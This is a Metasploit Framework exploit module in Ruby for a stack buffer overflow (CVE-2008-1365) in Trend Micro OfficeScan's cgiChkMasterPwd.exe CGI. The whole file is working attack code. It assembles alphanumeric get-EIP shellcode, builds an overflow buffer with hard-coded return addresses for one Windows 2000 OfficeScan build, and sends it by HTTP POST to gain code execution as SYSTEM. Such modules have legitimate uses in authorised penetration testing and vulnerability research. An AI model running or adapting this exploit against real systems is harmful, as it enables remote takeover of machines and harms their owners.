##
# $Id: trendmicro_officescan.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'metasm'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Trend Micro OfficeScan Remote Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Trend Micro OfficeScan
				cgiChkMasterPwd.exe (running with SYSTEM privileges).
			},
			'Author'         => [ 'toto' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-1365' ],
					[ 'OSVDB', '42499' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'MinNops'  => 0,
					'MaxNops'  => 0,
					'Space'    => 498,
					'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
					# clean up to prevent crash on exit
					'Prepend' => Metasm::Shellcode.assemble(Metasm::Ia32.new, "mov dword ptr fs:[0], 0").encode_string,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# return addresses need to be alphanumeric (here in loadhttp data section)
					[ 'Windows 2000 - Trend Micro OfficeScan 7.3.0.1293)', { 'Rets' => [0x63613035, 0x63613032] } ],
				],
			'DisclosureDate' => 'Jun 28 2007',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(8080),
			], self.class)
	end

	def exploit
		geip_src = "
			push esi
			push esp
			pop eax
			xor esi, [eax]
			push esi
			pop eax
			xor eax, got_eip
			push eax
			pop ecx
			got_eip:
		"

		sc = Metasm::Shellcode.assemble(Metasm::Ia32.new, geip_src)

		sc.base_addr = target['Rets'][0]
		get_eip = sc.encode_string

		pat = Rex::Text.rand_text_alphanumeric(1016)

		pat[0, get_eip.length] = get_eip
		pat[14, payload.encoded.length] = payload.encoded
		pat[512, 4] = [target['Rets'][1]].pack('V')    # string pointer (to prevent a crash)
		pat[524, 4] = [target['Rets'][0]].pack('V')    # sets EIP to the address where the shellcode has been copied
		pat[540, 4] = [target['Rets'][0]-1].pack('V')  # shellcode will be copied at this address (+1)

		data = "TMlogonEncrypted=!CRYPT!" + pat
		len = sprintf("%u", data.length);

		print_status("Trying target address 0x%.8x..." % target['Rets'][0])

		res = send_request_cgi({
			'uri'          => '/officescan/console/cgi/cgiChkMasterPwd.exe',
			'method'       => 'POST',
			'content-type' => 'application/x-www-form-urlencoded',
			'data'         => data,
		}, 5)

		handler
	end

end